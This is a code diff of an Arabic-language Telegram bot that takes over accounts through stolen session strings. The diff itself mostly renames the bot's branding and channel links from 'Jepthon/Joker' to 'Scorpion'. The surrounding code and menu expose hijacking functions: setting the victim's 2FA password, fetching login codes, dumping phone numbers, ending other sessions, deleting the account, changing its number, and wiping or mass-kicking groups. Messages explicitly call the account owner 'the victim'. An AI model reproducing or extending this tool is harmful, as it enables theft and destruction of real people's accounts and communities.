@@ -80,7 +80,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('jepthon')
+      await X.edit_2fa('Scorpion_scorp')
       return True
     except:
       return False
@@ -160,38 +160,38 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "jepthon"
+channel = "Scorpion_scorp"
 menu = '''
 
-"A" :~ [معرفه قنوات/كروبات التي يملكها]
+"A" : [معرفه قنوات/كروبات التي يملكها]
 
-"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
+"B" : [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
 
-"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
+"C" : [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
 
-"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
+"D" : [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
 
-"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
+"E" : [انضمام الى كروب/قناه عن طريق كود ترمكس] 
 
-"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
+"F" : [مغادره كروب /قناه عن طريق كود ترمكس]
 
-"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]
+"G" : [مسح كروب /قناه عن عن طريق كود ترمكس]
 
-"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
+"H" : [تاكد من التحقق بخطوتين /مفعل او لا]
 
-"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
+"I" : [انهاء جميع الجلسات ما عدا جلسة البوت]
 
-"J" :~ [حذف الحساب]
+"J" : [حذف الحساب]
 
-"K" :~ [حذف جميع المشرفين في كروب/قناه]
+"K" : [حذف جميع المشرفين في كروب/قناه]
 
-"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
+"L" : [ترقيه عضو الى مشرف داخل كروب/قناه]
 
-"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
+"M" : [تغير رقم الحساب باستخدام كود ترمكس]
 
 '''
 mm = '''
-قُم بلانضمام الى قناة العقرب @Scorpions_scorp 
+قُم بلانضمام الى قناة العقرب @Scorpion_scorp 
 '''
 
 keyboard = [
@@ -216,7 +216,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("العقرب |  𝗦𝗰𝗼𝗿𝗽𝗶𝗼 🦂", "https://t.me/Scorpions_scorp")
+    Button.url("العقرب |  𝗦𝗰𝗼𝗿𝗽𝗶𝗼 🦂", "https://t.me/Scorpion_scorp")
     ]
 ]
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
@@ -273,7 +273,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("القناة", "https://t.me/Scorpions_scorp")
+            Button.url("القناة", "https://t.me/Scorpion_scorp")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -294,7 +294,7 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @Jepthon")
+        file.write(i + "\n\nDetails BY @Scorpion_scorp")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -340,7 +340,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس الجوكر", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس العقرب", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -386,7 +386,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك الجوكر.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك العقرب.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -416,9 +416,9 @@ async def users(event):
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
       if i == True:
-      	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الجوكر.", buttons=keyboard)
+      	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك العقرب.", buttons=keyboard)
       else:
-          await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @rd0r0\n{i}")
+          await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @Zo_r0\n{i}")
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -508,7 +508,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("القناة", "https://t.me/Scorpions_scorp")
+        Button.url("القناة", "https://t.me/Scorpion_scorp")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
